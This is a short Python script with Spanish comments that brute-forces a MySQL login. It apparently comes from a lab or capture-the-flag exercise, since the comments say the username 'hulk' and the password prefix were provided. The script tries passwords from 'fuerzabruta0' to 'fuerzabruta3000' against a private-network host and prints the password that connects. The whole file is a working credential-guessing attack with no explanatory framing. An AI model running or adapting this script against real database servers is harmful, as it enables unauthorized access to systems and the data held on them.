import mysql.connector
from mysql.connector import Error

# Datos del MySQL
host = "192.168.56.108"  # Dirección del servidor MySQL
user = "hulk"       # Usuario proporcionado
password_prefix = "fuerzabruta"  # Prefijo de la contraseña proporcionada

# Función para intentar conexión
def try_mysql_connection(password):
    try:
        connection = mysql.connector.connect(
            host=host,
            user=user,
            password=password
        )
        if connection.is_connected():
            print(f"¡Contraseña correcta encontrada! {password}")
            connection.close()
            return True
    except Error as e:
        # Si la contraseña no es correcta, simplemente seguimos intentando
        return False

# Rango de contraseñas
for i in range(3001):  # Rango de 0 a 3000
    password = f"{password_prefix}{i}"
    print(f"Intentando con: {password}")
    
    if try_mysql_connection(password):
        break  # Termina si se encuentra la contraseña correcta
